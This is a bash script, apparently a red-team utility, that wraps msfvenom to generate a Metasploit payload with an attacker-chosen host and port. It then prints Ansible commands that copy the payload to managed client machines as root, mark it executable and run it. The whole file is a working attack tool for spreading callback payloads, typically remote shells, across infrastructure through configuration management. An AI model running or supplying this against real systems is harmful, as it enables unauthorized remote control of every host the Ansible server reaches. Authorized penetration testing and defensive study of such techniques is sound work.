#!/bin/bash

#   Useful Manual Commands:
#	msfvenom --list payloads
#	msfvenom --list encoders
#	msfvenom --help-formats

echo "msf-Ansible wrapper by Tanoy n0tty Bose"
echo "Usage: ./puppet_payload.sh <metasploit payload> <type of binary> <local host ip> <local host port> <output directory>"
mkdir -p ${5}/

msfvenom -p ${1} -f ${2} lhost=${3} lport=${4} > ${5}/payload.file
echo "The payload has been generated. Now you need to copy the payload file to /etc/ansible/ directory in the ansible server and then run the following commands: "
echo "ansible <ansibleclient> -m copy -a \"src=/etc/ansible/payload.file  dest=/tmp/\" -u root"
echo "ansible <ansibleclient> -m shell -a \"chmod +x /tmp/payload.file\" -u root"
echo "ansible <ansibleclient> -m shell -a \"/tmp/payload.file\""
echo ""
echo "to cleanup just delete /tmp/payload.file from the target <ansibleclient>"
